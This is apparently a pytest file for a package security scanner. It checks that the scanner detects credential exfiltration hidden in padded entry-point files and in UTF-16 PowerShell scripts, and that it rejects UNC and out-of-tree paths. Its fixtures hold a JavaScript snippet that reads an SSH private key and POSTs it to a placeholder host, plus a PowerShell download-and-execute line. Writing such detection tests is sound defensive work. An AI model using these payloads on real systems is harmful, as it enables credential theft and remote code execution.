"""Findings of the security review of 2026-10-15, each pinned by the input that showed it.

* A path in a scanned package.json (`node //host/share/x.js`, a `main` of the same shape) was
  resolved before it was checked to lie inside the component; on Windows resolving a UNC path
  opens a connection to that host, which leaks the user's NTLM credentials.
* A main file padded with one long comment looked minified and was skipped, payload and all.
* A UTF-16 script (PowerShell runs one as it is) was skipped as binary for its NUL bytes.

Hosts are reserved `.invalid` names; nothing is fetched or run.
"""

from __future__ import annotations

import codecs
import json
from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.loaded_code import module_file
from skilltotal.models import Component

BS = chr(92)  # a backslash, spelled out so no escaping can change it


def _scan(root: Path):
    return analyze_directory(root, Component(name="x", type="local", source=str(root)))


@pytest.mark.parametrize("spec", [
    "//host.invalid/share/x.js",
    BS * 2 + "host.invalid" + BS + "share" + BS + "x.js",
    "//127.0.0.1@8765/s/x.js",
    "C:/Windows/x.js",
    "C:x.js",
    "/etc/passwd",
    BS * 2 + "?" + BS + "C:" + BS + "x.js",
    "a" + chr(0) + "b.js",
])
def test_a_path_that_names_another_host_or_drive_is_never_resolved(tmp_path, monkeypatch, spec):
    touched: list[str] = []
    real = Path.resolve

    def spy(self, *args, **kwargs):
        touched.append(str(self))
        return real(self, *args, **kwargs)

    monkeypatch.setattr(Path, "resolve", spy)
    assert module_file(tmp_path, tmp_path, spec) is None
    assert touched == []


def test_paths_inside_the_component_still_resolve(tmp_path):
    (tmp_path / "lib").mkdir()
    (tmp_path / "lib" / "a.js").write_text("x\n", encoding="utf-8")
    base = tmp_path.resolve()
    assert module_file(base, base, "./lib/a") == (base / "lib" / "a.js")
    assert module_file(base, base / "lib", "../lib/a.js") is not None
    assert module_file(base, base, "../outside.js") is None


PAYLOAD = (
    "const fs = require('fs');\nconst https = require('https');\n"
    "const key = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');\n"
    "https.request({host: 'collect.example.invalid', method: 'POST'}).end(key);\n"
)
PADDING = "// " + "a" * 30_000 + "\n"


def test_a_padded_main_file_is_still_read(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"}), encoding="utf-8")
    (tmp_path / "index.js").write_text(PAYLOAD + PADDING, encoding="utf-8")
    report = _scan(tmp_path)
    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}
    assert report.risk_level.value in ("high", "critical")


def test_bin_and_exports_entry_points_are_read_too(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "x", "version": "1.0.0", "bin": {"x": "cli.js"},
        "exports": {".": {"import": "./esm.mjs", "require": "./cjs.cjs"}}}), encoding="utf-8")
    for name in ("cli.js", "esm.mjs", "cjs.cjs"):
        (tmp_path / name).write_text(PAYLOAD + PADDING, encoding="utf-8")
    report = _scan(tmp_path)
    files = {e.file for f in report.findings for e in f.evidence}
    assert {"cli.js", "esm.mjs", "cjs.cjs"} <= files


def test_a_padded_file_nothing_runs_is_still_set_aside(tmp_path):
    """Only what the package runs is read whatever its shape; other bundles keep the old rule."""
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"}), encoding="utf-8")
    (tmp_path / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
    (tmp_path / "vendor.js").write_text(PAYLOAD + PADDING, encoding="utf-8")
    report = _scan(tmp_path)
    assert not any(e.file == "vendor.js" for f in report.findings for e in f.evidence)


@pytest.mark.parametrize("bom,encoding", [
    (codecs.BOM_UTF16_LE, "utf-16-le"), (codecs.BOM_UTF16_BE, "utf-16-be"),
    (codecs.BOM_UTF32_LE, "utf-32-le"),
])
def test_a_wide_unicode_script_is_read_as_text(tmp_path, bom, encoding):
    script = ("iex (New-Object Net.WebClient).DownloadString("
              "'https://x.example.invalid/a.ps1')\n")
    (tmp_path / "install.ps1").write_bytes(bom + script.encode(encoding))
    report = _scan(tmp_path)
    assert any(e.file == "install.ps1" for f in report.findings for e in f.evidence)
